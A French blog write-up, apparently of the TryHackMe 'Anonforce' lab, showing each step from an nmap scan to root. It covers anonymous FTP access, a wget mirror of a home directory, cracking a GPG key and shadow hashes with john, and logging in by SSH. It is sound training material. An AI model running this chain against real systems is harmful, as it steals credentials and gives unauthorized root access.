---
title: "Write-up | Anonforce"
date: 2020-07-09T00:12:57+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Ce write-up sera sur la room Anonforce de [Try Hack Me](https://tryhackme.com). Elle est dans la catégorie "Easy".

## Reconnaissance

Comme à l'habitude, un petit `nmap` pour commencer :
```
$ nmap -sV -sC 10.10.170.171 -p- -oN scans/ports.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 20:59 CEST
Nmap scan report for 10.10.170.171
Host is up (0.061s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jul 08 13:57 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Déjà des bonnes nouvelles ! On peut se connecter au service FTP avec les creds de base (anonymous et pas de password).

## Exploitation

```
$ ftp 10.10.170.171
Connected to 10.10.170.171.
220 (vsFTPd 3.0.3)
Name (10.10.170.171:paradox): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls /home
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
```
Il y a un seul user dans `/home` : melodias. Le flag `user.txt` est dans dossier, mais on ne peut pas y accéder.

Il est cependant possible de le récupérer via `wget` :
```
$ wget -m ftp://anonymous:anonymous@10.10.170.171:/home/melodias/*
--2020-07-08 21:11:17--  ftp://anonymous:*password*@10.10.170.171/home/melodias/* => « 10.10.170.171/home/melodias/.listing »
Connexion à 10.10.170.171:21… connecté.
Ouverture de session en tant que anonymous… Session établie.
...
Terminé — 2020-07-08 21:11:21 —
Temps total effectif : 3,7s
Téléchargés : 8 fichiers, 5,6K en 0,2s (25,4 KB/s)
```
Il n'y a plus qu'à lire le flag `user.txt` sur sa machine !
J'essaie de récupérer le fichier `shadow` de la même manière mais impossible. Je récupère malgré tout `passwd`, mais il ne me sert à pas grand chose.

Avec un peu d'attention, on remarque la présence d'un dossier `notread` à la racine. Ce dossier contient 2 fichiers : `private.asc` et `backup.pgp`.

Avec `john`, on peut bruteforcer assez facilement un clé GPG.
```
$ sudo gpg2john private.asc > hash

File private.asc

$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
...
Press 'q' or Ctrl-C to abort, almost any other key for status
[edited]          (anonforce)
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Nous voilà donc en possession de la clé ! On va pouvoir ouvrir `backup.gpg` :
```
$ gpg --import private.asc 
gpg: clef B92CD1F280AD82C2 : « anonforce <melodias@anonforce.nsa> » n'est pas modifiée
gpg: clef B92CD1F280AD82C2 : clef secrète importée

$ gpg --decrypt backup.pgp
...
      « anonforce <melodias@anonforce.nsa> »
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7C[edited]m6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
...
melodias:$1$xDhc6S6G$IQHUW5ZtM[edited]EQtL1:18120:0:99999:7:::
...
```
Nous avons donc le `shadow` de la machine ! Avec le fichier `passwd` récupéré avant, il est possible de bruteforcer le password root !
```
$ sudo unshadow passwd shadow.txt > out.txt
$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt out.txt
... 
Press 'q' or Ctrl-C to abort, almost any other key for status
[edited]           (root)
...
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
On trouve bien le mot de passe root. J'essaie de me connecter en SSH en tant que root, et ça marche ! Plus qu'à lire `root.txt` :
```
# cat /root/root.txt 
[edited]
```

:)

Une petite room assez facile, mais vraiment sympa !
